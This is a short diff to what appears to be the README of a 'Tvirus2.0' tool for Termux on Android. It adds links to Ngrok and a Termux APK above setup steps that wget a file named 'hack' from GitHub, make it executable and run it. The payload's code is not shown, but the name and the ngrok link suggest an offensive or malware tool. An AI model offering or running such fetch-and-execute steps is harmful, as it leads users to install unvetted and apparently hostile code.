@@ -1,4 +1,8 @@
-#Follow This
+*Follow This
+Vist Ngrok = [Here](ngrok.com)
+Download Termux = [Here](https://f-droid.org/repo/com.termux_112.apk)
+
+
 ```
 pkg upgrade
 pkg install wget
@@ -8,3 +12,5 @@ wget https://raw.githubusercontent.com/T-Dynamos/Tvirus2.0/main/hack
 chmod +x *
 echo Exectue = ./hack
 ```
+
+
